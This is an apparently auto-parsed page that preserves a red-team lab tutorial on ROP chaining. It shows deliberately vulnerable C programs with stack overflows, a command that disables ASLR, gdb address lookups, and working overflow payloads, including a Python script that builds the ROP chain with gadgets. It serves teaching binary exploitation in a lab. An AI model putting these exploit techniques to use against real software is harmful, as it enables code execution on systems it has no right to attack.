---
parsed_by: focuslocust
source: redteamingtactics
type: generated
---
# ROP Chaining: Return Oriented Programming

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `redteamingtactics` |
| Type | `redteaming-topic` |
| Record ID | `rtt-offensive-security-code-injection-process-injection-binary-exploitation-rop-chaining-return-oriented-programming` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/redteaming-tactics-and-techniques/offensive-security/code-injection-process-injection/binary-exploitation/rop-chaining-return-oriented-programming.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [ROP Chaining: Return Oriented Programming](../../topics/offensive-security/rop-chaining-return-oriented-programming.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | rtt-offensive-security-code-injection-process-injection-binary-exploitation-rop-chaining-return-oriented-programming |
| name | ROP Chaining: Return Oriented Programming |
| type | redteaming-topic |
| source | redteamingtactics |
| url | https://github.com/mantvydasb/RedTeaming-Tactics-and-Techniques/blob/master/offensive-security/code-injection-process-injection/binary-exploitation/rop-chaining-return-oriented-programming.md |

## Preserved Source Material

````yaml
_asset_filenames:
- image (919).png
- image (921).png
- image (926).png
- image (927).png
- image (928).png
- image (931).png
- image (935).png
- image (941).png
- image (942).png
- image (954).png
- image (958).png
- image (959).png
- image (963).png
- image (965).png
- image (967).png
- image (969).png
- image (970).png
- pop-pop-ret-inspection.gif
- rop-chain-exploit-with-popret.gif
- rop-chain-exploit.gif
_body: "---\ncover: ../../../.gitbook/assets/rop-chain-exploit-with-popret.gif\ncoverY: 0\n---\n\n# ROP Chaining: Return Oriented\
  \ Programming\n\nThe purpose of this lab is to familiarize with a binary exploitation technique called Return Oriented Programming\
  \ (ROP), ROP chains / ROP gadgets. The technique is used to bypass Data Execution Protection (DEP).\n\n{% hint style=\"\
  warning\" %}\nDon't forget to disable the ASLR for this lab to work:\n\n```\necho 0 > /proc/sys/kernel/randomize_va_space\n\
  ```\n{% endhint %}\n\n## 1st ROP Chain\n\n### Vulnerable Code\n\nWe wil exploit the following code in a program `rop1a`\
  \ that is intentionally vulnerable with a classic stack-based overflow:\n\n{% tabs %}\n{% tab title=\"rop1a.c\" %}\n```c\n\
  #include <stdio.h>\n#include <string.h>\n\nvoid rop1() \n{\n    printf(\"ROP 1!\\n\");\n}\n\nvoid rop2() {\n    printf(\"\
  ROP 2!\\n\");\n}\n\nvoid rop3() {\n    printf(\"ROP 3!\\n\");\n}\n\nvoid vulnerable(char* string) \n{\n    char buffer[100];\n\
  \    strcpy(buffer, string);\n}\n\nint main(int argc, char** argv) \n{\n    vulnerable(argv[1]);\n    return 0;\n}\n```\n\
  {% endtab %}\n{% endtabs %}\n\nThe above program starts executing at `main()`, which calls `vulnerable()` where the user\
  \ supplied buffer will be copied into the variable `buffer[100]`.&#x20;\n\nNote that there are 3 functions `rop1`, `rop2`\
  \ and `rop3` that are never called during the normal program execution, but that's about to change and this is the purpose\
  \ of this lab - we're going to exploit the stack-based overflow and force the program to call all those rop functions one\
  \ after another.\n\n### Objective\n\nWe're going to exploit the classic stack-based overflow vulnerability in the function\
  \ `vulnerable` in the above code to trigger the functions `rop1()`, `rop2()` and `rop3()` sequentially, that are otherwise\
  \ not called during the vulnerable program's runtime. Additionally, after the `rop3()` function completes, we will make\
  \ the program call the libc function `exit()`, so that after the exploit completes its job, the program exits gracefully\
  \ rather than with a crash.\n\n{% hint style=\"info\" %}\nThe sequence of called functions `rop1() --> rop2() --> rop3()\
  \ --> exit()` forms a chain and this is where the term ROP chains come from.\n{% endhint %}\n\n### Stack Layout\n\nThe key\
  \ thing to understand with ROP chaining is the stack layout. In our case, the payload that we send to the vulnerable program\
  \ needs to overflow the stack and populate it in such a way, that the exploited program calls our wanted functions in the\
  \ following order:\n\n1. `rop1()`\n2. `rop2()`\n3. `rop3()`\n4. `exit()`\n\nIn other words, we need to ensure that the stack\
  \ in our vulnerable program `rop1a`, when the `vulnerable` function completes and is about to execute the `ret` instruction\
  \ to return to the caller function `main`, is organized like this:\n\n![We need to make sure the overflowed stack looks\
  \ like this](<../../../.gitbook/assets/image (954).png>)\n\nIf we think about the above graphic, we will realize that once\
  \ the stack is overflowed, the following will happen when the vulnerable program continues its execution:\n\n1. The `vulnerable`\
  \ function will return/jump to the `rop1()`. Note that before we overflowed the stack, this would have been a return address\
  \ back to the `main` function, to be precise - the `return 0` statement in line 26 as seen in the [Vulnerable Code](rop-chaining-return-oriented-programming.md#vulnerable-code)\
  \ secion;\n2. Once `rop1()` completes, it will execute the `ret` instruction, which will pop the `rop2()` function address\
  \ off the stack and jump to it;\n3. Once `rop2()` completes, it will execute the `ret` instruction, which will pop the `rop3()`\
  \ function address off the stack and jump to it;\n4. Once `rop3()` completes, it will execute the `ret` instruction, which\
  \ will pop the `exit()` function address off the stack and jump to it;\n\nWe will later confirm this with gdb in the [Inspecting\
  \ the Stack](rop-chaining-return-oriented-programming.md#inspecting-the-stack) section.\n\n### Payload\n\nBased on the above\
  \ graphic and stack understanding so far, our payload should look something like this:\n\n```\npayload = AAAAs... + BBBB\
  \ + &rop1 + &rop2 + &rop3 + &exit\n```\n\n...or for easier cross-reference - using the same colours as those seen in the\
  \ above stack layout diagram:\n\n![Payload structure visualized](<../../../.gitbook/assets/image (969).png>)\n\nLet's find\
  \ out the values we need to populate our payload with. Compile our vulnerable program `rop1a`:\n\n```python\ngcc -m32 -fno-stack-protector\
  \ -z execstack rop1a.c -o rop1a\n```\n\nStart debugging it with [gdb-peda](https://github.com/longld/peda) and put a breakpoint\
  \ on `main()` and continue execution:\n\n```python\ngdb rop1a\nb main\nc\n```\n\nNow, let's find out addresses for our functions\
  \ `rop1`, `rop2`, `rop3` and `exit`:\n\n```csharp\ngdb-peda$ p rop1\n$1 = {<text variable, no debug info>} 0x565561a9 <rop1>\n\
  \ngdb-peda$ p rop2\n$2 = {<text variable, no debug info>} 0x565561d4 <rop2>\n\ngdb-peda$ p rop3\n$3 = {<text variable, no\
  \ debug info>} 0x565561ff <rop3>\n\ngdb-peda$ p exit\n$4 = {<text variable, no debug info>} 0xf7e02950 <exit>\n```\n\nBelow\
  \ shows the function addresses in gdb:\n\n![Key function addresses to be used in the payload](<../../../.gitbook/assets/image\
  \ (919).png>)\n\nHaving found the function addreses, our payload visualization can now be updated like this:\n\n![Payload\
  \ structure with ROP function addresses](<../../../.gitbook/assets/image (967).png>)\n\nThe last thing we need to know is\
  \ how many AAAAs we must send in to the `vulnerable` program before we can take over the EIP and overwrite the return address\
  \ of the `vulnerable` function and point it to our first ROP chain function - `rop1`.\n\nBelow screenshot indicates that\
  \ the offset of interest is 112 (0x70), or in other words, we need to send 112 A characters to smash the stack:\n\n![EIP\
  \ offset](<../../../.gitbook/assets/image (921).png>)\n\nSee below notes for more details on how to find the offset at which\
  \ we can overwrite the `vulnerable` function's return address:\n\n{% content-ref url=\"stack-based-buffer-overflow.md\"\
  \ %}\n[stack-based-buffer-overflow.md](stack-based-buffer-overflow.md)\n{% endcontent-ref %}\n\nKnowing the EIP offset,\
  \ we can now now visualize the full payload like this:\n\n![Payload structure with correct EIP offset and ROP function addresses](<../../../.gitbook/assets/image\
  \ (970).png>)\n\n### Exploit\n\nWe can now construct the full payload in python and send it to our vulnerable program `rop1a`\
  \ like this:\n\n```python\n./rop1a \"$(python -c 'print \"A\"*108 + \"BBBB\" + \"\\xa9\\x61\\x55\\x56\" + \"\\xd4\\x61\\\
  x55\\x56\" + \"\\xff\\x61\\x55\\x56\" +  \"\\x50\\x29\\xe0\\xf7\"')\"\n```\n\nIf we execute it, we can see that`rop1`, `rop2`\
  \ and `rop3` functions are called successfully as they each call their respective `printf()` statements:\n\n![1st ROP chain\
  \ in action](../../../.gitbook/assets/rop-chain-exploit.gif)\n\nNote how the program did not crash with some segfault -\
  \ this is because `rop3` called `exit` upon return. To re-inforce this understanding, we will see how that came to be in\
  \ the below section.\n\n### Inspecting the Stack Layout\n\nLet's explore the stack layout of the vulnerable program `rop1a`\
  \ when the `vulnerable()` function gets exploited and is about to return after it completes executing - when the CPU is\
  \ about to execute the `ret` instruction.\n\nBelow screenshot shows the initial diagram on the left, indicating how we needed\
  \ the stack to look like during the exploitation and gdb screenshots on the right, that confirm we successfully built the\
  \ required stack:\n\n![Stack layout during vulnerable function's execution](<../../../.gitbook/assets/image (958).png>)\n\
  \nFrom the above screenshot, note the following key points:\n\n1. `vulnerable()` function is about to execute the `ret`\
  \ instruction at `0x56556254`;\n2. `ret` instruction will pop the top-most value from the stack, which is a memory address\
  \ of the `rop1()` function and jump to it, this way kicking off our ROP chain execution.\n\nNext, once `rop1()` is about\
  \ to return, the `ret` instruction will pop the top-most value from the stack, which is a memory location of `rop2()` and\
  \ jump to it:\n\n![rop1 is about to return, pop the rop2 address from the stack and jump to it](<../../../.gitbook/assets/image\
  \ (926).png>)\n\nOnce `rop2()` is about to return, the `ret` instruction will pop the top-most value from the stack, which\
  \ is a memory location of `rop3()` and jump to it:\n\n![rop2 is about to return, pop the rop3 address from the stack and\
  \ jump to it](<../../../.gitbook/assets/image (927).png>)\n\nOnce `rop3()` is about to return, the `ret` instruction will\
  \ pop the top-most value from the stack, which is a memory location of `exit()` and jump to it:\n\n![rop3 is about to return,\
  \ pop the exit address from the stack and jump to it](<../../../.gitbook/assets/image (928).png>)\n\nThis illustrates how\
  \ we managed to build our first ROP chain by organizing the stack in such a way that forced the vulnerable program to call\
  \ `rop1`, which upon return called `rop2`, which upon return called `rop3`, which upon return called `exit`:\n\n![1st ROP\
  \ chain in action](../../../.gitbook/assets/rop-chain-exploit.gif)\n\n## 2nd ROP Chain\n\nOur first ROP chain called 4 functions\
  \ and none of them were called with arguments. Let's build our second ROP chain that will call functions with some arguments\
  \ and see how we need to build the stack this time around.\n\n### Vulnerable Code\n\nWe're going to re-use the same code,\
  \ but modify it so that `rop2` and `rop3` functions will take 1 and 2 arguments respectively and will print them out accordingly\
  \ when called:\n\n{% tabs %}\n{% tab title=\"rop1b.c\" %}\n```c\n#include <stdio.h>\n#include <string.h>\n\nvoid rop1()\
  \ {\n    printf(\"ROP 1!\\n\");\n}\n\nvoid rop2(int a) {\n    printf(\"ROP 2: %x!\\n\", a);\n}\n\nvoid rop3(int a, int b)\
  \ {\n    printf(\"ROP 3: %x, %x!\\n\", a, b);\n}\n\nvoid vulnerable(char* string) {\n    char buffer[100];\n    strcpy(buffer,\
  \ string);\n}\n\nint main(int argc, char** argv) {\n    vulnerable(argv[1]);\n    return 0;\n}\n```\n{% endtab %}\n{% endtabs\
  \ %}\n\n### Objective\n\nThe objective is to subvert our vulnerable program `rop1b` and make it call functions `rop1`, `rop2`,\
  \ `rop3` and `exit` the same way we did it with our first ROP chain, however, this time `rop2` function is declared as `rop2(int\
  \ a)` and `rop3` as `rop3(int a, int b)`, meaning we will have to somehow (hint: using stack) pass 1 argument to `rop2`\
  \  and 2 arguments to `rop3`.\n\n### Stack Layout\n\nBelow shows what the stack needs to look like this time. Annotations\
  \ explain the purpose of each memory address or value on the stack:\n\n![Required stack layout for our 2nd ROP chain](<../../../.gitbook/assets/image\
  \ (959).png>)\n\nTo re-inforce, stack for our second ROP chain has the following key differences when compared to the stack\
  \ of the first ROP chain:\n\n1. Stack contains arguments for functions `rop2` and `rop3`;\n2. Stack contains 2 additional\
  \ memory addresses, called ROP gadgets:\n   1. `pop ret` - for popping off the `arg1` argument that was passed to `rop2`\
  \ function and then jumping to `rop3` (because `ret` instruction will pop the `rop3` address off the stack that will be\
  \ at the top once the `arg1` is removed from the stack, and jump to it);\n   2. `pop pop ret` - for popping off the 2 arguments\
  \ `arg1` and `arg2` (hence 2 pops) that were passed to the `rop3` function and then jumpt to `exit` (because `ret` instruction\
  \ will pop the `exit` address off the top of the stack that will be there after the 2 arguments are removed).\n\n### ROP\
  \ Gadgets\n\n{% hint style=\"info\" %}\n* ROP gadgets are sequences of CPU instructions that are already present in the\
  \ program being exploited or its loaded shared libraries and can be used to execute almost any arbitrary code;\n* ROP gagdgets\
  \ most often end with the `ret` instruction;\n* ROP gadgets bypass the DEP (NX bit protection), since there is no executable\
  \ code being injected to and executed from the stack, instead existing executable code is used to achieve the same malicious\
  \ intent.\n{% endhint %}\n\nIn gdb-peda, we can find addresses of the 2 gadgets that we are interested in (`popret` for\
  \ `rop2` and `pop2ret` for `rop3`) by issuing the `ropgadet` command:\n\n![ropgadgets in rop1b vulnerable program](<../../../.gitbook/assets/image\
  \ (931).png>)\n\n```python\ngdb-peda$ ropgadget \nret = 0x5655600a\npopret = 0x5655601e\npop2ret = 0x5655630a\npop3ret =\
  \ 0x56556309\npop4ret = 0x56556308\naddesp_12 = 0x5655601b\naddesp_16 = 0x565560fe\n```\n\nTo confirm that the rop gadget\
  \ does what it says it will, we can inspect the instructions for the rop gadget `popret = 0x5655601e` and we will see that\
  \ it indeed contains 2 CPU instrutions `pop ebx & ret`: &#x20;\n\n![popret ROP gadget instructions](<../../../.gitbook/assets/image\
  \ (935).png>)\n\n### Payload\n\nNow that we know how the stack should look like, let's build the payload for our second\
  \ ROP chain.\n\nFirst off, let's get addresses of our `rop1`, `rop2`, `rop3` and the libc `exit` functions:\n\n```python\n\
  gdb-peda$ p rop1\n$4 = {<text variable, no debug info>} 0x565561b9 <rop1>\ngdb-peda$ p rop2\n$5 = {<text variable, no debug\
  \ info>} 0x565561e4 <rop2>\ngdb-peda$ p rop3\n$6 = {<text variable, no debug info>} 0x56556212 <rop3>\ngdb-peda$ p exit\n\
  $7 = {<text variable, no debug info>} 0xf7e02950 <exit>\n```\n\n![rop1, rop2, rop3 and exit function addresses inside rop1b\
  \ vulnerable program](<../../../.gitbook/assets/image (941).png>)\n\nLet's also note the `popret` and `pop2ret` gagdet addresses:\n\
  \n![ROP gadget addresses for rop1b vulnerable program](<../../../.gitbook/assets/image (942).png>)\n\nSince we now know\
  \ how the stack needs to look like and we have addresses for our functions and ROP gadgets, we can visualize our payload\
  \ like this:\n\n![Visualized payload for the 2nd ROP chain](<../../../.gitbook/assets/image (963).png>)\n\n### Exploit\n\
  \nWe can now translate the above visualized payload to python like so:\n\n```python\n./rop1b \"$(python -c 'print \"A\"\
  *108 + \"BBBB\" + \"\\xb9\\x61\\x55\\x56\" + \"\\xe4\\x61\\x55\\x56\" + \"\\x1e\\x60\\x55\\x56\" + \"\\xef\\xbe\\xef\\xbe\"\
  \ + \"\\x12\\x62\\x55\\x56\" + \"\\x0a\\x63\\x55\\x56\" + \"\\xad\\xde\\xad\\xde\" + \"\\xd3\\xc0\\xd3\\xc0\" + \"\\x50\\\
  x29\\xe0\\xf7\" ')\"\n```\n\nBelow shows how the above payload is sent to the vulnerable program `rop1b`, that executes\
  \ `rop1`, `rop2` with argument `0xbeefbeef` that gets printed out and `rop3` with 2 arguments `0xdeaddead` and `0xc0d3cod3`\
  \ which too get printed and finally gracefully exits:\n\n![2nd ROP chain with arguments and rop gadgets works as expected](../../../.gitbook/assets/rop-chain-exploit-with-popret.gif)\n\
  \n### Inspecting the Stack Layout\n\nTo avoid repeating what we saw in the [Stack Layout](rop-chaining-return-oriented-programming.md#stack-layout)\
  \ section for our first ROP chain, let's just see how the `pop2ret` ROP gadget works and how it affects the stack during\
  \ execution, since that is the only difference worth mentioning:\n\n![Inspecting the stack layout](../../../.gitbook/assets/pop-pop-ret-inspection.gif)\n\
  \nNote the following key points from the above gif:\n\n* We're on a breakpoint inside the `rop3` function, where it's about\
  \ to return by executing the `ret` instruction;\n* At the top of the stack, there's an address of a `pop2ret` ROP gadget\
  \ with `pop edi; pop ebp; ret` instructions inside a libc shared library loaded by our vulnerable program;\n* `0xdeaddead`\
  \ and `0xc0d3c0d3` are on the stop of the stack, just below the `pop2ret` address;\n* Once the `ret` is executed, the code\
  \ jumps to the said `pop2ret` ROP gagdet;\n* `pop2ret` instructions `pop edi; pop ebp` execute and `0xdeaddead` and `0xc0d3c0d3`\
  \ are popped from the stack;\n* Address of the libc `exit()` function is now on top of the stack;\n* Finally, `ret` instruction\
  \ executes, which pops the `exit()` address from the stack and jumps to it, completing our second ROP chain execution and\
  \ gracefully closing the vulnerable program.\n\n{% hint style=\"info\" %}\nWe could have chosen to inspect the `popret`\
  \ gadget and we would have seen a nearly identical behaviour to the one noted above, except that `popret` would have popped\
  \ only one value from the stack before executing the `ret` instruction.\n{% endhint %}\n\n## Useful Python\n\n### Little\
  \ Endian Converter\n\nBelow is a useful python snippet that converts a given memory address, i.e `0x565561d4`, to it's little-endian\
  \ format, i.e `\\\\xd4\\\\x61\\\\x55\\\\x56`:\n\n```python\nimport struct\n'\\\\x' + '\\\\x'.join(x.encode('hex') for x\
  \ in struct.pack('I', 0x565561d4)).encode(\"utf-8\")\n'\\\\xd4\\\\x61\\\\x55\\\\x56'\n```\n\n### Payload Executor\n\nBelow\
  \ shows an easy way to build the stack using `struct.pack` that does not require us to deal with little-endiannes when specifying\
  \ memory addresses in the exploit:\n\n```python\n#!/usr/bin/env python\nimport os\nimport struct\n\npop_ret = 0x5655601e\n\
  pop_pop_ret = 0x5655630a\nrop1 = 0x565561b9\nrop2 = 0x565561e4\nrop3 = 0x56556212\nexit = 0xf7e02950\n\n# Build the stack\n\
  # Overflow\npayload =  \"A\"*108\npayload += \"BBBB\"\n\n# Address of rop1()\npayload += struct.pack(\"I\", rop1)\n\n# Address\
  \ of rop2(), address of pop ret and an argument for rop2()\npayload += struct.pack(\"I\", rop2)\npayload += struct.pack(\"\
  I\", pop_ret)\npayload += struct.pack(\"I\", 0xbeefbeef)\n\n# Address of rop3(), adress of pop pop ret, and arguments 1\
  \ and 2\npayload += struct.pack(\"I\", rop3)\npayload += struct.pack(\"I\", pop_pop_ret)\npayload += struct.pack(\"I\",\
  \ 0xdeaddead)\npayload += struct.pack(\"I\", 0xc0dec0de)\n\n# Address of exit()\npayload += struct.pack(\"I\", exit)\n\n\
  # Execute the full payload\nos.system(\"./rop1b '\" + payload + \"'\")\n```\n\nOnce the payload is constructed, we can execute\
  \ it:\n\n```\npython payload.py\n```\n\n![ROP chains executed successfully](<../../../.gitbook/assets/image (965).png>)\n\
  \n## References\n\n{% embed url=\"https://codearcana.com/posts/2013/05/28/introduction-to-return-oriented-programming-rop.html\"\
  \ %}\n\n{% embed url=\"https://www.ret2rop.com/2018/08/return-to-libc.html\" %}\n\n{% embed url=\"https://medium.com/@codingkarma/rop-the-easy-way-7a3b28070bbf\"\
  \ %}\n\n{% embed url=\"https://www.fuzzysecurity.com/tutorials/expDev/7.html\" %}\n\n{% embed url=\"https://bordplate.no/blog/en/post/interactive-rop-tutorial/\"\
  \ %}\n\n{% embed url=\"https://ctf101.org/binary-exploitation/return-oriented-programming/\" %}\n\n{% embed url=\"https://tc.gts3.org/cs6265/2019/tut/tut06-01-rop.html\"\
  \ %}"
_relative_path: offensive-security/code-injection-process-injection/binary-exploitation/rop-chaining-return-oriented-programming.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/redteaming-tactics-and-techniques/offensive-security/code-injection-process-injection/binary-exploitation/rop-chaining-return-oriented-programming.md
````
